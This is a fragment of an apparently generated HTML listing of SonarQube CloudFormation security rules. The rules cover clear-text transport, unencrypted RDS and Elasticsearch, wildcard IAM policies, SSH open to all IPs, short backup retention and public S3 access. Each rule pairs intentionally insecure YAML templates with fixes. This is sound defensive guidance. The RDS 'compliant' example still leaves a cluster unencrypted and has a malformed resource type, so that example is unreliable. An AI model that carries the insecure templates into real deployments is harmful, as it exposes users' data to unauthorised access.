          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S5332">
              cloudformation:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/kinesis/" rel="nofollow">AWS Kinesis</a> Data Streams, server-side encryption is disabled by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  KinesisStream: # Sensitive
    Type: AWS::Kinesis::Stream
    Properties:
      ShardCount: 1
      # No StreamEncryption
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/" rel="nofollow">Amazon ElastiCache</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::ElastiCache::ReplicationGroup
    Properties:
      ReplicationGroupId: &#34;example&#34;
      TransitEncryptionEnabled: false  # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/ecs/" rel="nofollow">Amazon ECS</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  EcsTask:
    Type: AWS::ECS::TaskDefinition
    Properties:
      Family: &#34;service&#34;
      Volumes:
        -
          Name: &#34;storage&#34;
          EFSVolumeConfiguration:
            FilesystemId: !Ref FS
            TransitEncryption: &#34;DISABLED&#34;  # Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Load Balancer Listeners</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  HTTPlistener:
   Type: &#34;AWS::ElasticLoadBalancingV2::Listener&#34;
   Properties:
     DefaultActions:
       - Type: &#34;redirect&#34;
         RedirectConfig:
           Protocol: &#34;HTTP&#34;
     Protocol: &#34;HTTP&#34; # Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html" rel="nofollow">Amazon OpenSearch domains</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::OpenSearchService::Domain
    Properties:
      DomainName: example
      DomainEndpointOptions:
        EnforceHTTPS: false # Sensitive
      NodeToNodeEncryptionOptions:
        Enabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> communications between clients and brokers:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  MSKCluster:
    Type: &#39;AWS::MSK::Cluster&#39;
    Properties:
      ClusterName: MSKCluster
      EncryptionInfo:
        EncryptionInTransit:
          ClientBroker: TLS_PLAINTEXT # Sensitive
          InCluster: false # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/kinesis/" rel="nofollow">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  KinesisStream:
    Type: AWS::Kinesis::Stream
    Properties:
      ShardCount: 1
      StreamEncryption:
         EncryptionType: KMS
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/" rel="nofollow">Amazon ElastiCache</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::ElastiCache::ReplicationGroup
    Properties:
      ReplicationGroupId: &#34;example&#34;
      TransitEncryptionEnabled: true
</pre>
<p>For <a href="https://aws.amazon.com/ecs/" rel="nofollow">Amazon ECS</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  EcsTask:
    Type: AWS::ECS::TaskDefinition
    Properties:
      Family: &#34;service&#34;
      Volumes:
        -
          Name: &#34;storage&#34;
          EFSVolumeConfiguration:
            FilesystemId: !Ref FS
            TransitEncryption: &#34;ENABLED&#34;
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Load Balancer Listeners</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  HTTPlistener:
   Type: &#34;AWS::ElasticLoadBalancingV2::Listener&#34;
   Properties:
     DefaultActions:
       - Type: &#34;redirect&#34;
         RedirectConfig:
           Protocol: &#34;HTTPS&#34;
     Protocol: &#34;HTTP&#34;
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html" rel="nofollow">Amazon OpenSearch domains</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::OpenSearchService::Domain
    Properties:
      DomainName: example
      DomainEndpointOptions:
        EnforceHTTPS: true
      NodeToNodeEncryptionOptions:
        Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,
allowing you to omit writing the <code>EncryptionInTransit</code> configuration. However, if you need to configure it explicitly, this configuration
is compliant:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  MSKCluster:
    Type: &#39;AWS::MSK::Cluster&#39;
    Properties:
      ClusterName: MSKCluster
      EncryptionInfo:
        EncryptionInTransit:
          ClientBroker: TLS
          InCluster: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6303">
              cloudformation:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br /> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul><li> A malicious insider working at the cloud provider gains physical access to the storage device. </li><li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li></ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of services and security bypasses via data corruption or deletion </li></ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br /> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html" rel="nofollow">AWS::RDS::DBInstance</a> and
<a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html" rel="nofollow">AWS::RDS::DBCluster</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  DatabaseInstance:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
  DatabaseCluster:
    Type: AWS::RDS:DBCluster
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html" rel="nofollow">AWS::RDS::DBInstance</a> and
<a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html" rel="nofollow">AWS::RDS::DBCluster</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  DatabaseInstance:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: true
  DatabaseCluster:
    Type: AWS::RDS:DBCluster
    Properties:
      StorageEncrypted: false  # Sensitive, disabled by default
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html" rel="nofollow">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6302">
              cloudformation:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul><li> only require a subset of these permissions to perform the intended function. </li><li> have monitored activity showing that only a subset of these permissions is actually used. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: &#34;2012-10-17&#34;
            Statement:
                - Effect: Allow
                  Action:
                    - &#34;*&#34; # Sensitive
                  Resource:
                    - !Ref MyResource
        Roles:
            - !Ref MyRole
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: &#34;2012-10-17&#34;
            Statement:
                - Effect: Allow
                  Action:
                    - &#34;s3:GetObject&#34;
                  Resource:
                    - !Ref MyResource
        Roles:
            - !Ref MyRole
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cloud.google.com/iam/docs/understanding-roles" rel="nofollow">Google Cloud Documentation</a> - Understanding roles </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6308">
              cloudformation:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>
<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.
Enabling encryption at rest will help protect:</p>
<ul><li> indices </li><li> logs </li><li> swap files </li><li> data in the application directory </li><li> automated snapshots </li></ul>
<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>
<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html" rel="nofollow">AWS::Elasticsearch::Domain</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Elasticsearch:
    Type: AWS::Elasticsearch::Domain
    Properties:
      EncryptionAtRestOptions:
        Enabled: false  # Sensitive, disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html" rel="nofollow">AWS::Elasticsearch::Domain</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Elasticsearch:
    Type: AWS::Elasticsearch::Domain
    Properties:
      EncryptionAtRestOptions:
        Enabled: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html" rel="nofollow">AWS Documentation</a> - Encryption of
  data at rest for Amazon Elasticsearch Service </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6321">
              cloudformation:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound
traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,
such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      VpcId: !Ref ExampleVpc
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22 # SSH traffic
          CidrIp: &#34;0.0.0.0/0&#34; # from all IP addresses is authorized
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      VpcId: !Ref ExampleVpc
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22
          CidrIp: &#34;1.2.3.0/24&#34;
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6364">
              cloudformation:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require this component to be backed up for a specific amount of time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/rds/" rel="nofollow">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  relationaldatabase:
    Type: &#39;AWS::RDS::DBInstance&#39;
    Properties:
      DBName: NonCompliantDatabase
      BackupRetentionPeriod: 2 # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/rds/" rel="nofollow">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  relationaldatabase:
    Type: &#39;AWS::RDS::DBInstance&#39;
    Properties:
      DBName: CompliantDatabase
      BackupRetentionPeriod: 5
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6265">
              cloudformation:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul><li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively &#34;read&#34; and &#34;read and write&#34; privileges to everyone in the world
  (<code>AllUsers</code> group). </li><li> <code>AuthenticatedRead</code> grants &#34;read&#34; privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context
of canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PublicReadWrite</code> access control:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;mynoncompliantbucket&#34;
      AccessControl: &#34;PublicReadWrite&#34;
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Compliant
    Properties:
      BucketName: &#34;mycompliantbucket&#34;
      AccessControl: &#34;Private&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl" rel="nofollow">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html" rel="nofollow">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6281">
              cloudformation:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>
<ul><li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li><li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li><li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li><li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li><li> Many users have the permission to set ACL or policy to the S3 bucket. </li><li> These settings are not already enforced to true at the account level. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul><li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li><li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li><li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li><li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>PublicAccessBlockConfiguration</code> is fully deactivated (nothing is blocked):</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucketdefault:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;example&#34;
</pre>
<p>This <code>PublicAccessBlockConfiguration</code> allows public ACL to be set:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;example&#34;
      PublicAccessBlockConfiguration:
        BlockPublicAcls: false # should be true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
</pre>
<h2>Compliant Solution</h2>
<p>This <code>PublicAccessBlockConfiguration</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public
policies:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Compliant
    Properties:
      BucketName: &#34;example&#34;
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html" rel="nofollow">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6317">
              cloudformation:S6317
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an Identity (a User, a Group or Role) are
called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>Here is an example of a policy document defining a limited set of permission that grants a user the ability to manage his own access keys.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;arn:aws:iam::245500951992:user/${aws:username}&#34;,
